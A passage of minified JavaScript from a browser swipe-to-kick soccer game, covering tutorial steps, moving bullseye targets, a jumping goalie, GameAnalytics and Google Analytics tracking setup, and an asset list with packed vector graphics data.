        return l("swipe", function() {
            G.show({
                x: 1024,
                y: $.sprite.y,
                fingerAction: "swipeTo",
                swipeToX: J.sprite.x - $.sprite.x,
                swipeToY: -($.sprite.y - J.sprite.y),
                rotation: 0
            })
        }, 40), !0
    }), X.addTutorial("4", Host.Localize.Translate("Look! it moves!", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("Aim and time your kick carefully"), function() {
        return !0
    }), X.addTutorial("5", Host.Localize.Translate("Oh it's a boss bullseye!", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("This may require an attempt or two"), function() {
        return !0
    }), X.addTutorial("10", Host.Localize.Translate("A Goalie? time for a curved swipe!", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("Draw the curve you want the ball to follow"), function() {
        return l("swipe", function() {
            G.show({
                x: 1024,
                y: $.sprite.y,
                fingerAction: "swipeTo",
                swipeToX: J.sprite.x - $.sprite.x,
                swipeToY: -($.sprite.y - J.sprite.y),
                rotation: 0,
                swipeToAngle: -1
            })
        }, 40), !0
    }), X.addTutorial("11", Host.Localize.Translate("Great job! let's do that again", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("Draw the curve you want the ball to follow"), function() {
        return l("swipe", function() {
            G.show({
                x: 1024,
                y: $.sprite.y,
                fingerAction: "swipeTo",
                swipeToX: J.sprite.x - $.sprite.x,
                swipeToY: -($.sprite.y - J.sprite.y),
                rotation: 0,
                swipeToAngle: 1
            })
        }, 40), !0
    }), X.addTutorial("12", Host.Localize.Translate("You're a champion!", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("You can handle any obstacles thrown your way"), function() {
        return X.vars.onFinish = !0, !0
    }), S.add(function() {
        if (f.render3DAll(), f.z += (.3 * $.z + 300 - f.z) / 10, f.z > 550 && (f.z = 550), f.x += (.3 * $.x - f.x) / 10, f.x = r.hardLimit(f.x, -2e3, 2e3), f.y = .3 * $.y - 650 - $.z / 10, f.viewport.y = 200 - .5 * $.y, te.draw(), H.x = te.sprite.x, H.y = te.sprite.y - 100 * te.sprite.scale.x * 3, q.x = H.x - 60, q.y = te.sprite.y, q.scale.set(2.3 * te.sprite.scale.x, 2.3 * te.sprite.scale.y * f.z / 300 * f.z / 300), W.x = 1024, W.y = H.y + 60, W.scale.set(.6 + f.z / 400), ee)
            for (var e in _.chance() && W.addChild(T.shockwave({
                    x: _.spectrum(1e3),
                    y: -350 + _.spectrum(300)
                }, {
                    texture: "flash_0" + _.value(2, 1),
                    scale: 2 * Math.random() + .5
                })), j) j[e].x = j[e].pos.x + _.spectrum(5), j[e].y = j[e].pos.y + _.spectrum(10)
    }), J = new function(e) {
        var t = this;
        g.setup3D(t), t.sprite = new Container, t.graphic = new Container, t.graphic.addChild(p.spawn("bullseye")), t.shadow = p.spawn("ball_shadow"), t.z = te.z - e, t.x = 0, t.y = -300, t.isActive = !1, t.speed;
        var i, n = 0,
            o = t.z,
            a = t.x,
            s = t.y;
        t.shadow.alpha = .2, K.addChild(t.sprite), t.sprite.addChild(t.graphic), S.add(function() {
            n += z.bullseyeInc, t.y = s, t.x = a + Math.sin(n) * z.bullseyeVelocity, !i || $.z < t.z || (i = !1)
        }), t.reset = function() {
            t.isActive = !0, t.shadow.alpha = .2, t.isHit = !1, t.z = o, x.fadeIn(t.graphic), i = !0, n = 999 * Math.random();
            var e = z.bullseye[0];
            "big" == e && (t.isHalf = !1, t.scale = 1.4, t.radius = 450), "small" == e && (t.isHalf = !0, t.scale = .8, t.radius = 300), t.altitude = z.bullseye[1], s = -340, "air" == t.altitude && (s -= 250), "ground" == t.altitude && (s += 250);
            var r = z.bullseye[2];
            a = 0, "right" == r && (a += 560), "left" == r && (a -= 560), t.xPos = t.x = a, t.yPos = t.y = s
        }, t.tryHit = function() {
            if (r.hipotenusa($.position, t) > t.radius) return !1;
            if (x.fadeOut(t.graphic, .3), T.explodeObstacle({
                    x: 0,
                    y: 0
                }, {
                    parent: t.sprite
                }), t.isHit = !0, x.bounceScaleFloor(t.graphic, null, .5, .5), y.play("bullseye"), ie.isHit) P.increase(5), B++;
            else {
                if (X.vars.hitStar) return !1;
                P.increase(1)
            }
            return !0
        }, t.debugPos = function(e, t) {}
    }(1), u.y = 100;
    var ie = new function(e) {
            var t = this;
            g.setup3D(t), t.sprite = new Container;
            var i = new Container,
                n = p.spawn("bonus"),
                o = p.spawn("bonus_shadow");
            t.shadow = new Container, n.scale.set(.4), o.scale.set(.3), i.addChild(n), t.shadow.addChild(o), t.z = te.z - e, t.x = 0, t.y = -500, t.scale = .6;
            var a, s = !1,
                l = (t.speed, 0),
                h = 0,
                d = 0,
                c = (t.z, t.x),
                u = t.y;
            t.altitude, t.isPicking, t.shadow.alpha = .6, t.sprite.addChild(i), S.add(function() {
                t.isPicking && (t.x += ($.x - t.x) / 2, t.y += ($.y - t.y) / 2, t.z += ($.z - t.z) / 2), s && (l += .1, h += .09, d += .03, t.y = u + 10 * Math.sin(l), t.x = c + 25 * Math.sin(d), t.rotation = Math.sin(h) / 10, !a || $.z < t.z - 20 || (a = !1, I.increase(), t.altitude != $.altitude || r.hipotenusa(t.sprite, $.getPosition()) > 800 || (t.isPicking = !0, T.splatt(t.sprite), s = !1, x.fadeOut(i, .3), x.bounceScaleFloor(i, null, .5, .5), t.shadow.alpha = 0, y.play("bonus"), t.isHit = !0)))
            }), t.reset = function() {
                if (s = !1, t.sprite.visible = !1, t.shadow.visible = !1, t.isPicking = !1, t.sprite.y = -9999999, b.removeChild(t.sprite), b.removeChild(t.shadow), !z.pickup) return x.fadeOut(i, .1);
                K.addChild(t.sprite), K.addChild(t.shadow), t.isHit = !1, s = t.sprite.visible = t.shadow.visible = !0, t.shadow.alpha = .2, a = !0, x.fadeIn(i, .4), t.z = 120, 0 == (c = -J.x / 2) && (c = _.chance() ? -300 : 300), "left" == z.pickup && (c = -300), "right" == z.pickup && (c = 300), "center" == z.pickup && (c = J.x / 4), t.x = c, t.altitude = J.altitude, "air" == t.altitude && (u = -400), "mid" == t.altitude && (u = -200), "ground" == t.altitude && (u = -120), t.y = u, l = 999 * Math.random(), h = 999 * Math.random(), d = 999 * Math.random()
            }
        },
        ne = new function() {
            var e = this;
            g.setup3D(e), K.addChild(e.sprite), K.addChild(e.shadow), S.add(function() {
                if (i && (i.scale.set(t.scale.x, t.scale.y), e.isActive)) {
                    e.z, $.z;
                    var o = Math.abs(e.x - $.x);
                    if (e.z += l.z, l.z *= .9, e.x, !a && $.canHit && $.z > 250 && (a = !0, $.y < -50 && (e.jump(), e.rotation = ($.finalPos - e.x) / ("mid" == $.altitude ? 1500 : 4e3))), e.canWalk && (l.x += e.x < .5 * J.x ? .5 : -.5, e.x += l.x), r ? (l.y += 2, e.y += l.y, e.rotation += -e.rotation / 40, e.y > 0 && (e.y = 0, r = !1, e.rotation = 0, e.protect(!0))) : e.rotation = 0, e.shadow.rotation = e.rotation, n && !($.z < e.z) && (n = !1, !(o > h))) return e.hitBall()
                }
            }), e.z = te.z - 170, e.x = 0, e.scale = 1.4, e.isActive = !1;
            var t, i, n, r, o, a, s = e.z,
                l = new v;
            e.sprite_prepare = p.spawn("archer_prepare"), e.sprite_jump = p.spawn("archer_jump"), e.sprite_prepare_shadow = p.spawn("archer_prepare"), e.sprite_jump_shadow = p.spawn("archer_jump");
            var h = 200;

            function d() {
                t.scale.set(1.6, .5), new Tween(t.scale, {
                    x: .7,
                    y: 1.5
                }, .2, Tween.easeout).callback = function() {
                    new Tween(t.scale, {
                        y: 1,
                        x: 1
                    }, .2, Tween.easeout)
                }
            }
            e.reset = function() {
                if (!z.goalie) return e.hide();
                e.setSprite(e.sprite_prepare, e.sprite_prepare_shadow), e.isActive = e.sprite.visible = e.shadow.visible = !0, n = !0, o = !1, r = !1, e.rotation = 0, e.y = 0, e.z = s, l.x = 0, l.z = 0, a = !1, e.sprite.visible = !0, e.canWalk = "walk" == z.goalie, e.x = .5 * J.x, e.canWalk && (e.x = _.chance() ? 200 : -200)
            }, e.hide = function() {
                e.isActive = !1, e.sprite.visible = !1, e.shadow.visible = !1
            }, e.protect = function(t) {
                t && e.land()
            }, e.land = function() {
                e.setSprite(e.sprite_prepare, e.sprite_prepare_shadow), d()
            }, e.cancel = function() {}, e.jump = function() {
                o || (e.setSprite(e.sprite_jump, e.sprite_jump_shadow), r = !0, l.y = -45, "mid" == $.altitude && (l.y = -30), d())
            }, e.hitBall = function() {
                O("HIT BALL!"), $.catched(l.x, e), r || d()
            }, e.setSprite = function(n, r) {
                b.removeChild(t), b.removeChild(i), i = r, (t = n).anchor.set(.5, .98), i.anchor.set(.5, .98), i.tint = 0, i.alpha = .19, e.sprite.addChild(t), e.shadow.addChild(i)
            }
        };
    b.toFront(A), c.margin.y = 2, A = new L, T.blendMode = 0, b.toFront(T), u.start(function() {
        F.reset(), z.reset(), B = 0, $.reset(!0), f.render3DAll()
    })
}
Config.template = "web", Config.frvr_repo_statuses = '{"frvr-tools":{"hash":"5310e19471e94e047b44ea5dfb54a3140d28bb5d","dirty":false,"branch":"master","tag":null},"frvr-internal":{"hash":"0dae184d2859da16554350089061ef7b5410381a","dirty":false,"branch":"master","tag":null},"game-soccer":{"hash":"9eebd98e31029a476dcff9bc095948f0d05892e8","dirty":false,"branch":"develop","tag":null,"toolsSubmoduleType":"edg"}}', Config.build_time = "2019-12-18T10:38:57Z",
    function(e) {
        var t = e.XS = e.XS || {};
        var i = {
                channel: void 0,
                channelMapping: {},
                isLoaded: !1,
                preLoadQueue: [],
                oninit: function(t, i) {
                    var n, r, o, a, s, l = this,
                        h = t.channelMapping;
                    for (var d in h)
                        for (var c = d.split(","), u = 0; u < c.length; u++) this.channelMapping[c[u]] = h[d];
                    n = document, r = t.url, o = function() {
                        var i = GameAnalytics;
                        i("configureBuild", e.gaPath), i("setEventProcessInterval", 15), i("configureAvailableResourceCurrencies", (t.currencies || "").split(",").slice(0, 20)), i("configureAvailableResourceItemTypes", (t.itemtypes || "").split(",").slice(0, 20)), i("configureAvailableCustomDimensions01", (t.customDimensions01 || "").split(",").slice(0, 20)), i("setEnabledInfoLog", !1), i("initialize", t.key || Config.gaKey, t.secret || Config.gaSecret), l.isLoaded = !0;
                        for (var n = l.preLoadQueue; n.length > 0;) l.onevent.apply(l, n.shift())
                    }, a = n.createElement("script"), s = n.getElementsByTagName("script")[0], a.onload = o, a.async = "true", a.crossOrigin = "anonymous", a.src = r, s.parentNode.insertBefore(a, s)
                },
                onevent: function(e, i, n, r, o) {
                    if (!this.isLoaded) return this.preLoadQueue.push([e, i, n, r, o]);
                    "game_end" === e && "lose" === r.dimension10 && (o = this.parseArgs(this.eventMap["game_end-lose"], r));
                    var a = t.track.getChannel();
                    (a = this.channelMapping[a] || a) !== this.channel && (this.channel = a, GameAnalytics("setCustomDimension01", this.channel)), GameAnalytics.apply(GameAnalytics, o)
                }
            },
            n = _jsonData["track-gma"].key || Config.gaKey,
            r = _jsonData["track-gma"].secret || Config.gaSecret;
        n && r && t.track.addProvider("gma", i)
    }(this),
    function(e) {
        var t = e.XS = e.XS || {},
            i = {
                globalState: void 0,
                oninit: function(e, t) {
                    this.eventCategory = Config.id;
                    var i = this.trackers = [],
                        n = e.gaIds || {},
                        r = [];
                    for (var o in n) r.push(n[o]);
                    for (var o in n)
                        if (n[o]) {
                            var a = window.gaAppInfo;
                            ga("create", n[o], "auto", o, a), ga(o + ".set", a), i.push({
                                name: o,
                                uaid: n[o]
                            })
                        }
                    ga(function(e) {
                        _jsonData.scitylana && ga("all.require", "scitylana", _jsonData.scitylana)
                    })
                },
                ga: function(e) {
                    for (var t = this.trackers, i = 0; i < t.length; i++) ga(t[i].name + ".send", "event", e)
                },
                onevent: function(e, i, n, r, o) {
                    void 0 === o && (o = []);
                    var a = {};
                    if (t.track.dataIsDirty || void 0 === this.globalState) {
                        this.globalState = (this.parseArgs(this.config.state, r) || [])[0], t.track.dataIsDirty = !1;
                        for (var s = 0; s < this.trackers.length; s++) ga(this.trackers[s].name + ".set", this.globalState);
                        for (var l in this.globalState) a[l] = this.globalState[l]
                    }
                    if (a.eventCategory = this.eventCategory, a.eventAction = e, void 0 !== o[0] && (a.eventAction = o[0]), void 0 !== o[1] && (a.eventLabel = o[1]), void 0 !== o[2] && (a.eventValue = o[2]), "object" == typeof o[3])
                        for (var h in o[3]) a[h] = o[3][h];
                    this.ga(a)
                }
            };
        t.track.addProvider("ga", i)
    }(this), stage.orientationMode = "fixed", stage.orientation = "portrait", XS.styles.margins.bottom = 0,
    function() {
        XS.emit("startLoading"), setTimeout(function() {
            XS.track.customEvent("session_engage_low")
        }, 6e4), setTimeout(function() {
            XS.track.customEvent("session_engage_high")
        }, 6e5), setTimeout(function() {
            preload.apply(this, XS.modulesToPreload.concat([function() {
                XS.loadConfig(Config.id), XS.audio._init(), XS.data._init()
            }, game, function() {
                XS.initComplete = !0, XS.emit("resize", {}), XS.emit("gameLoaded"), window.Social && window.Social()
            }, function() {
                setTimeout(function() {
                    Host.ShowGame && Host.ShowGame(), XS.emit("showFullscreenAd", {
                        first: !0
                    }), htmlclean()
                }, XS.is.iOS ? 300 : 1)
            }]))(function(e, t) {
                htmlprogress(e, e - t)
            }), XS.emit("force-resize", {})
        }, 1)
    }();
loadAssets(["i/g/s/icon_sound.svg", "i/g/_bitmapfontstroke.svg", "i/g/_particle.svg", "i/g/_shockwave.svg", "i/g/archer_jump.svg", "i/g/archer_prepare.svg", "i/g/archery.svg", "i/g/audience_01.svg", "i/g/audience_02.svg", "i/g/audience_03.svg", "i/g/audience_04.svg", "i/g/audience_05.svg", "i/g/star2.svg", "i/g/background_bottom.svg", "i/g/ball.svg", "i/g/ball_shade.svg", "i/g/ball_shadow.svg", "i/g/bg_gradient.svg", "i/g/bonus.svg", "i/g/s/sliderslider.svg", "i/g/bullseye.svg", "i/g/bullseye_half.svg", "i/g/circle.svg", "i/g/circle2.svg", "i/g/condense.svg", "i/g/confetti_01.svg", "i/g/confetti_02.svg", "i/g/confetti_03.svg", "i/g/s/icon_twitter.svg", "i/g/confetti_05.svg", "i/g/confetti_06.svg", "i/g/crown.svg", "i/g/field_markings.svg", "i/g/_bitmapfont.svg", "i/g/finger.svg", "i/g/flag_01.svg", "i/g/flag_02.svg", "i/g/flash_01.svg", "i/g/flash_02.svg", "i/g/grass_01.svg", "i/g/grass_02.svg", "i/g/grass_03.svg", "i/g/s/sliderbg.svg", "i/g/s/sidebar.svg", "i/g/s/menutile.svg", "i/g/s/icon_credits.svg", "i/g/s/icon_facebook.svg", "i/g/s/icon_feedback.svg", "i/g/s/icon_frvr.svg", "i/g/s/icon_gplus.svg", "i/g/s/icon_legal.svg", "i/g/s/icon_map.svg", "i/g/s/icon_music.svg", "i/g/s/icon_new.svg", "i/g/s/icon_share.svg", "i/g/s/icon_shop.svg", "i/g/confetti_04.svg", "i/g/field_wall.svg", "i/g/aura.png", "i/g/bonus_shadow.png", "i/g/line.png", "i/g/liveslost.png", "i/g/s/icon_ad.png", "i/g/slash.png", "i/g/trace_head.png", "i/g/tracer.png"], ["yw6nm///////////////q9opEnm//P9nm//P9nm//P", "6nm//////l//////lm////l/////o6nm///l//////ll///m///l//////l///m//l///l/l//m//l///l/l//o6nml//lllllo6nmlllll//lllmlll/l/lllo6nml//////llll///////l/o6nmlll///////lll/ll//////llmllll//////l///l///////lo6nml///////l/////l///////l///////llo6nm//lll////l///lll//l////lll//////////m///////ll/////l////l//ll///l////lo6nmllllllllllllmlllllo6nmllllllllllllmlllllllllllmllllmlllo6nm///llllll////l////ll////llo6nm//lll////l///lllllll////l//m////l//l//lllllll/l//ll////llo6nm////l////ll////l///lllm//l//lo6nm//l////lll////l///ll//m//l////lll///ll////ll//m/l//l/ml//l//o6nmlllllllo6nmlllllllmlllllllo6nm//////l//l////l//llm///////m///////o6nm///l//l////l//l///m//l/ll/l//////l/ll/l//m///////m/l//////m////l///m///////o6nm////l////ll////l///llm//l//lo6nm//lll////l///l////l//ml////l////ll///ll/l///lm/l//l/m/l//l/o6nmllllllllllllo6nmllllllllllllmllllllllllllo", "6nml5l5l5l5o", "D888Fn2o", "6nm////////o6nm/////////////o6nm////////o6nm/////////o6nm/////////////onm///////////////o6nm//////////o6nm//////////o6nm////////o6nm///////o6nm//////o6nm///////o6nm///o6nm///o6nm///o6nm///o6nm///////o6nm//////////o6nm///////o6nm////o6nm///o6nm///onm//o6nm////l//o6nm//////o6nm////o6nm//////o6nm///o6nm////////o6nm////o6nm/////o6nm///onm//o6nm///////o6nm/////o6nm///o6nm///o6nm////o6nm///o6nm//o6nm/////o6nm/////o6nm/l///o6nm//////o6nm////o6nm////o6nm////onm////o6nm/////o6nm////o6nm///o6nm////o6nm////o6nm///o6nm/////o6nm///o6nm///o6nm////o6nm//o6nm///o6nm////o6nm//o6nm//////o6nm///o6nm///////o6nm////o6nm///o6nm//o6nm//o6nm//////o6nm///o6nm//o6nm////o6nm//o6nm/////o6nm//o6nm///o6nm////o6nm///o6nm//o6nm//o6nm//o6nm///o6nm//o6nm///o6nm//onm//o6nm/////////o6nm////o6nm//o6nm///o6nm///o6nm/////o6nm///o6nm////o6nm/////o6nm//////o6nm//////o6nm/////o6nm/////o6nm/////o6nm////o6nm////o6nm/////o6nm////o6nm////o6nm////o6nm/////o6nm/////o6nm///o6nm/////o6nm/////o6nm//////o6nm////o6nm//o6nm///o6nm///o6nm///o6nm///o6nm/////o6nm///////o6nm//////o6nm////o6nm///o6nm//o6nm//o6nm////o6nm//o6nm///o6nm///o6nm////lo6nm////o6nm////o6nm///o6nm///o6nm//o6nm////o6nm///o6nm///onm//o6nm////o6nm//////o6nm////o6nm/l///o6nm////o6nm///l/l/o6nm////o6nm///o6nm////////o6nm///////o6nm///o6nm//o6nm////o6nm////o6nm/////o6nm////o6nm//o6nm////o6nm///o6nm/////o6nm////o6nm////o6nm////o6nm///onm//o6nm////o6nm///////o6nm//o6nm//////o6nm//o6nm///o6nm////////o6nm////o6nm/////o6nm//o6nm//o6nm/////o6nm//onm//o6nm/////o6nm////o6nm///o6nm//////o6nm////o6nm///o6nm///o6nm///o6nm///o6nm//////o6nm/////o6nm//o6nm/////o6nm///o6nm//////o6nm//o6nm/////////o6nm///o6nm///o6nm///o6nm///o6nm////o6nm////o6nm///o6nm////o6nm//onm///o6nm/////o6nm/////o6nm///o6nm///o6nm/////o6nm/////////o6nm///o6nm////////o6nm///o6nm//o6nm////o6nm///o6nm/////o6nm//////o6nm////o6nm///o6nm////o6nm/////////o6nm////o6nm///o6nm//o6nm//o6nm////o6nm///o6nm//onm//o6nm//o6nm////o6nm//onm//o6nm//o6nm///o6nm//o6nm//onm//o6nm//o6nm//o6nm//onm//o6nm//onm//o6nm///o6nm/ll/o6nm//o6nm///o6nm////o6nm//o6nm///o6nm/////o6nm//o6nm//o6nm///o6nm//////////////o6nm////o6nm///o6nm///o6nm////o6nm///o6nm///////////o6nm///o6nm////o6nm///o6nm///o6nm///o6nm////o6nm///onm////o6nm//////o6nm/////o6nm//////o6nm/////o6nm///o6nm/////o6nm////o6nm////o6nm////o6nm/////o6nm/////////////o6nm//o6nm///o6nm//o6nm/////o6nm///o6nm///o6nm//////o6nm//o6nm////o6nm///o6nm///o6nm//l/o6nm///o6nm///o6nm///o6nm/////o6nm////o6nm////o6nm////o6nm///o6nm/////o6nm///o6nm//o6nm///o6nm////o6nm////o6nm///o6nm///o6nm//////o6nm////o6nm/////o6nm///o6nm////////l/////o6nm/////////////o6nm/////////o6nm//////o6nm///o6nm///o6nm//o6nm///o6nm//o6nm//o6nm////o6nm///onm//o6nm///o6nm///o6nm//o6nm////o6nm//o6nm///o6nm//o6nm///o6nm//o6nm///o6nm//o6nm////o6nm///o6nm////o6nm///o6nm/////o6nm//o6nm/////o6nm//o6nm//o6nm//o6nm///o6nm///o6nm//o", "6nm//////////////o6nm//////o6nm/////o6nm////o6nm////o6nm/////////////////////o6nm/////////////////////onm////o6nm/////////o6nm/////////o6nm///o6nm////o6nm////o6nm///o6nm//o6nm////////////////////o6nm///////o6nm/////////o6nm//////////o6nm////o6nm////o6nm////o6nm///o6nm/////////////////////////o6nm///////////o6nm////////////o6nm//////////////o6nm/////o6nm/////////o6nm///o6nm/////o6nm///o6nm/////o6nm///o6nm//////o6nm///o6nm////o6nm///o6nm////o6nm///o6nm/////o6nm///o6nm///o6nm////o6nm///o6nm//o6nm/////////////////o6nm/////////////o6nm/////////o6nm////o6nm////o6nm//////o6nm////o6nm////o6nm//////o6nm////o6nm//////o6nm/////o6nm///o6nm///o6nm////o6nm////o6nm///o6nm///o6nm////o6nm//////////o6nm////////o6nm//////o6nm//////o6nm/////o6nm//////o6nm/////o6nm/////o6nm///onm////o6nm////o6nm///o6nm////o6nm////o6nm///o6nm////////o6nm//o6nm/////////o6nm//o6nm////o6nm///////o6nm//////////o6nm/////////////o6nm/////////o6nm/////o6nm///////o6nm///////////o6nm////o6nm///////o6nm/////o6nm//////o6nm/////o6nm/////o6nm/////o6nm///o6nm////o6nm////o6nm//o6nm////////o6nm//////o6nm//l///////o6nm////o6nm///o6nm///onm////o6nm////o6nm//////o6nm////o6nm//o6nm//o6nm//o6nm//o6nm////o6nm///////o6nm/////////////o6nm///////////o6nm////o6nm///o6nm////o6nm////o6nm////o6nm////o6nm///o6nm////o6nm////o6nm////o6nm////o6nm////////o6nm//////o6nm/////o6nm////o6nm////o6nm///o6nm///o6nm/////////o6nm///o6nm////o6nm/////o6nm////////o6nm///o6nm////o6nm/////o6nm///o6nm///o6nm///o6nm//o6nm//o6nm//o6nm////o6nm/////////////////////////////o6nm//////////o6nm////o6nm////o6nm///o6nm//////o6nm/////o6nm/////o6nm///o6nm/////o6nm//o6nm///o6nm///////////////o6nm////////o6nm///o6nm////o6nm/////o6nm///o6nm////o6nm////o6nm///o6nm///o6nm////o6nm////////o6nm//////o6nm///o6nm//onm//o6nm////o6nm/////o6nm//o6nm////o6nm////o6nm///o6nm////o6nm///o6nm//o6nm///o6nm////o6nm///o6nm/////o6nm///o6nm////o6nm/////////////////////////o6nm////////o6nm///////o6nm///lo6nm////o6nm///////o6nm//////o6nm//////o6nm///////o6nm///o6nm/////o6nm////o6nm//o6nm//o6nm//o6nm////o6nm////o6nm//o6nm////o6nm//o6nm//o6nm///o6nm////o6nm////o6nm///o6nm//o6nm//o6nm////o6nm//////o6nm///o6nm///o6nm///o6nm////l///o6nm///o6nm///o6nm////o6nm//////////o6nm///o6nm//o6nm/////o6nm///o6nm////o6nm////o6nm////o6nm///o6nm///////o6nm///o6nm////o6nm//o6nm////o6nm//////////o6nm////o6nm////o6nm//o6nm//o6nm//o6nm///o6nm//o6nm////o6nm/////o6nm////onm///o6nm/////o6nm///o6nm///o6nm////o6nm////onm//o6nm/////o6nm///o6nm///onm//o6nm///o6nm/////o6nm///o6nm//////o6nm//o6nm/////o6nm///o6nm///o6nm//o6nm///o6nm///o6nm/////o6nm////o6nm//o6nm//onm//o6nm//o6nm////o6nm//////o6nm/////o6nm////o6nm////o6nm////o6nm//o6nm//o6nm///o6nm/////lo6nm//o6nm//////o6nm///o6nm//o", "yw9pEnm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nmlP9nmP9nm/P9nmP9nm/P9nmP9nm/P9nmP9nm/P9nm/P9nm/P9nm/P9nmlP9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nm/P9nmlP9nmlP9nmlP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmlP9nmlP9nmlP9nmlP9nmlP9nmlP9nmlP9nmlP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmP9nmlP9nmP9nmlP9nmlP9nmlPE9nmllP9nmllP9nmlPE9nmlPE9nmP9nmP9nmP9nmP6nml2l2lll2l2lo6nml5l5l5l5onml5l5l5l5o6nml2l2l2l2o6Knml25l2l25l2oK6nml2l25l2l25o6Knml2l25l2l25oK6nml2l25l2l25o6Knml2l25l2l25oK", "4t8888888FfnmlllCfAnml5l5l5l5orrbnml2l2l2l2o6n2o", "4t8888888FfnmlllCfAnml5l5l5l5orrbnml2l2l2l2o6n2o", "4t8888888FfnmlllCfAnml5l5l5l5orrbnml2l2l2l2o6n2o", "4t88888888FfnmlllCfAnml5l5l5l5orrbnml2l2l2l2o6n2o", "4t8888888FfnmlllCfAnml5l5l5l5orrbnml2l2l2l2o6n2o", "6nmllllllllllo", "4t888FfnmlllCfAnml5l5l5l5orrbnml5l5l5l5o", "6nml222///l/o6nm///o6nm///////o6nml////o6nml////l/o6nm//l/o6nm//////onm//llo6nm//lll/o6nm/////o6nm///lonm/////o6nmll/////o6nm2/////l/o6nml////lo6nml/////o6nm////////o6nm//////////o", "6nm////////o", "n2o", "4t88FfnmlllCnml5l5l5l5orbnml5l5l5l5o", "6nm//////////o6nm//////2//2////o4t8888FfnmlllCnml5l5l5l5orbnm//////////o6nm////////o6nm////////onm///o6nml///onm////////onm////o6nm////onm////o6n2on2onm/2l//2//o", "ywt88F9t88GEnm/l/l/l/lqoP", "6n2on2o6n2o6n2o6n2o6n2o6n2o6Knm/2//2/oK", "6nm////lo6nm///lo6n2o", "6n2o", "6nm////m////lo", "6nm////////////////m////lo", "6nm////2//mmmmo", "6nm////2//mmmmo", "6nm////2//mmmmo", "6nm//////////l////////l/lmo", "6nml2l2l2l2o", "6nml2l2l2l2o", "6nmllllllon2on2on2o", "6nml5l5l5l5onmllllonmllllonmllllonmllllllllonm//l//lo", "6nm//////l//////lm////l/////onml//lllllonml//////llll///////l/onml///////l/////l///////l///////llonmlllllllllllmlllllonm///llllll////l////ll////llonm////l////ll////l///lllm//l//lonmlllllllonm//////l//l////l//llm///////m///////onm////l////ll////l///llm//l//lonmllllllllllllo", "t88888888Fnm2lllot88Fnml2lll2lo6nm////o6nm2/2o", "6nm/l/o6nm/l/o6nm/l/o", "6nm/l/o6nm/l/o6nm/l/o", "6nmll2ll2ll2ll2o4D8888888FfnmlllCfAnml5l5l5l5orrbn2o", "6nmll2ll2ll2ll2o4D88888888FfnmlllCfAnml5l5l5l5orrbn2o", "4t888FfnmlllCfAnml5l5l5l5orrbnm2/22/2ot888Fnm2/22/2ot888Fnm2/2l/2o", "4t888FfnmlllCfAnml5l5l5l5orrbnm2/22/2/ot888Fnm2l2l2ot888Fnml2/2/2o", "4t888FfnmlllCfAnml5l5l5l5orrbnm2//22/22222/2ot888Fnm/2///22/2l2//222o", "ywt88888F9pEnm/l/l/l/lqoPp9nmlPp9nmlPp9nmlPp9nmlP", "yw9pEnm/l/l/l/lqP6n2o6nm/l/l/l/lot88Fnmlllo", "6nm2l2l2l2lm2l2l2l2lm2l2l2l2lm2l2l2l2lm2l2l2l2lm2l2l2l2lm2l2l2l2lonm2l2l2l2lo", "yw6nmlllmlllmlllmlllmlllmlllmlllmlllmlllmlllmlllo9pEnmlllllllllllllllllllllllqP", "6nml/l/llllll//ll/llllll/l/o", "yw9pEnm//ll///qP6nm////mllllonml////l////llm////o", "yw9pEnmllllllllllllllllllllllllqP", "fnnml/l/l/lC6nm////l////////m//m////mo6rfnnmlllC6nmllllllllllllmor", "yw9pEn2qP6nml////l////llm////o", "nm///////////////////6nm////////m////onm/////////////l/////onm////", "6nm//////////////////o", "yw9pEn2qP9nmlP9nmlP", "yw9pEnmlllllP6nmlllllllllo", "6nml5l5l5l5onm///////////l/o", "6nml2l2l2l2o", "t888Fnml/l/l/l/o6nml/l/l/l/ot888Fnml/l/l/l/o6nml/l/l/l/ot888Fnml/l/l/l/o6nml/l/l/l/ot888Fnml/l/l/l/o6nml/l/l/l/ot888Fnml/l/l/l/o6nml/l/l/l/ot888Fnml/l/l/l/o6nml/l/l/l/ot888Fnml/l/l/l/o6nml/l/l/l/ot888Fnml/l/l/l/o6nml/l/l/l/ot888Fnml/l/l/l/o6nml/l/l/l/ot888Fnml/l/l/l/o6nml/l/l/l/o"], ["(y(y~<><><>SklBjlSklWplUklrvlQkl!1lQkl92lqklb4l$ilp4l&hlx4l#glg4lPgl83lRdlH1ljalJyluXlUvl2Ulcsl2UlcslzQlcslSOlcsl5Lljsl(HfslcGlZslTFlbrlOFlvolIFlcklIFlIglOFl/bl(EgZldGlTYl1IlOYlvLlGYlpOlQYliRlQYl2UlQYl2UlQYlQXl2Vl3ZlPTlTcluQl6elGOlfflhNl;fl0Ml0glPMlLilPLlRklbMlRklLOlTklIVlSklFclSklBjl(K~<><><>(Dw2luOlw2luOl88lOZl88lBjl88lJtlw2lp4lw2lp4l(KlwlcVllwlcVl00lqcl00lTjl00lLqllwl-xllwl-xl(KDql:alDql:alsslZflsslfjlssltnlDqlZslDqlZsl", 